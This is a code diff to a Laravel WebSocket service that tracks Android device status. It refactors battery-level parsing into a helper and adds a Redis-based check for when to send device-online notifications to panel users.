@@ -6,6 +6,7 @@ namespace App\WebSocket\Services;
 
 use App\Models\Device;
 use App\Services\GeoIpService;
+use App\WebSocket\Config\WebSocketConfig;
 use App\WebSocket\ConnectionManager;
 use App\WebSocket\WebSocketLog;
 use Illuminate\Support\Facades\Redis;
@@ -112,10 +113,10 @@ final class DeviceStatusService
             $updates['android_version'] = $status['android_version'];
         }
         if (isset($status['battery_charge'])) {
-            // 解析 "t~88" 格式，提取电量数字
-            $parts = explode('~', $status['battery_charge']);
-            $level = count($parts) >= 2 ? (int) $parts[1] : (int) $status['battery_charge'];
-            $updates['battery_level'] = $level;
+            $level = BatteryParser::parseLevel($status['battery_charge']);
+            if ($level !== null) {
+                $updates['battery_level'] = $level;
+            }
         }
         if (isset($status['accessibility'])) {
             $updates['has_accessibility'] = $status['accessibility'] === '1';
@@ -130,17 +131,33 @@ final class DeviceStatusService
             $updates['ip_location'] = $status['ip_location'];
         }
 
+        $wasOffline = !$device->getOriginal('is_online');
         $device->update($updates);
 
-        if ($isNewDevice || !$device->getOriginal('is_online')) {
-            $this->connectionManager->notifyPanelUsersDeviceOnline($phoneId, $device->user_id, [
-                'phone_id' => $phoneId,
-                'phone_name' => $status['phone_name'] ?? '',
-                'model' => $status['model'] ?? '',
-                'battery_charge' => $status['battery_charge'] ?? '',
-                'is_online' => true,
-            ]);
+        $shouldNotifyOnline = $isNewDevice
+            || $wasOffline
+            || $this->isNewWebSocketConnection($phoneId);
+
+        if ($shouldNotifyOnline) {
+            WebSocketLog::getLogger()->info("Device online notification: {$phoneId}, isNew={$isNewDevice}, wasOffline={$wasOffline}");
+
+            $phoneInfo = $this->formatForPanel($phoneId);
+            $this->connectionManager->notifyPanelUsersDeviceOnline($phoneId, $device->user_id, $phoneInfo);
         }
+    }
+
+    private function isNewWebSocketConnection(string $phoneId): bool
+    {
+        $key = WebSocketConfig::lastNotifiedKey($phoneId);
+        $lastNotified = Redis::get($key);
+        $now = time();
+
+        Redis::setex($key, WebSocketConfig::lastNotifiedTtl(), (string) $now);
+
+        if ($lastNotified === null) {
+            return true;
+        }
+        return ($now - (int) $lastNotified) > WebSocketConfig::newConnectionThreshold();
     }
 
     private function createDevice(string $phoneId, array $status): ?Device
@@ -157,12 +174,9 @@ final class DeviceStatusService
             return null;
         }
 
-        // 解析电量
-        $batteryLevel = null;
-        if (isset($status['battery_charge'])) {
-            $parts = explode('~', $status['battery_charge']);
-            $batteryLevel = count($parts) >= 2 ? (int) $parts[1] : (int) $status['battery_charge'];
-        }
+        $batteryLevel = isset($status['battery_charge'])
+            ? BatteryParser::parseLevel($status['battery_charge'])
+            : null;
 
         return Device::create([
             'uuid' => $phoneId,
